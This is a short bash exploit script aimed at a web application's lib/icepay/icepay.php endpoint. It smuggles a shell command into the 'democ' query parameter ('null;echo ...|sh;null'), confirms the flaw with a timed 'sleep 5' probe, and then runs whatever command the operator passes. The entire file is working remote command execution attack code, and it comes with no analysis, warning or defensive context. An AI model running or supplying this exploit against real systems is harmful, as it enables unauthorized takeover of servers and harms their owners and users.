#!/bin/bash

if [ "$#" -ne 2 ]; then
    echo "Usage: $0 <TARGET_URL> <COMMAND>"
    exit 1
fi

TARGET="$1"
COMMAND="$2"

url_encode() {
    local STRING="$1"
    local ENCODED=""
    local CHAR

    for (( i = 0; i < ${#STRING}; i++ )); do
        CHAR="${STRING:i:1}"
        case "$CHAR" in
            [a-zA-Z0-9.~_-]) ENCODED+="$CHAR" ;;
            *) ENCODED+=$(printf '%%%02X' "'$CHAR") ;;
        esac
    done
    echo "$ENCODED"
}

send_command() {
    local CMD_ENCODED
    CMD_ENCODED=$(url_encode "$1")

    curl -sk --max-time 10 "$TARGET/lib/icepay/icepay.php?democ=null;echo%20$CMD_ENCODED|sh;null"
}

test_vulnerability() {
    echo "[*] Testing vulnerability with sleep 5..."
    local START_TIME END_TIME
    START_TIME=$(date +%s)
    send_command "sleep 5" > /dev/null
    END_TIME=$(date +%s)

    if (( END_TIME - START_TIME >= 5 )); then
        echo "[+] Target is vulnerable!"
    else
        echo "[-] Target is NOT vulnerable."
        exit 1
    fi
}

test_vulnerability

echo "[*] Sending command: $COMMAND"
send_command "$COMMAND"
